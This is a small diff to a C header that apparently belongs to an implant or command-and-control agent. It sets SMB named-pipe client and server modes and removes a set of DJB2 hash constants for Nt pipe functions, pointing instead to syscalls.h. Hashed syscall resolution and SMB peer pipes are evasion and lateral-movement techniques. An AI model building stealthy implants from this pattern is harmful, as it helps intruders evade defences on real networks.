@@ -65,11 +65,7 @@
 #define SMB_MODE_CLIENT             0   /* Connect to existing pipe      */
 #define SMB_MODE_SERVER             1   /* Create and listen on pipe     */
 
-/* DJB2 hashes for Nt pipe functions */
-#define HASH_NTREADFILE             0x3835E743  /* "NtReadFile"              */
-#define HASH_NTWRITEFILE            0x11C97B12  /* "NtWriteFile"             */
-#define HASH_NTCREATENAMEDPIPEFILE  0x904C50CE  /* "NtCreateNamedPipeFile"   */
-#define HASH_NTFSCONTROLFILE        0xF914FBE1  /* "NtFsControlFile"         */
+/* Nt pipe function hashes — defined in syscalls.h */
 
 /* ------------------------------------------------------------------ */
 /*  SMB peer connection tracking                                       */
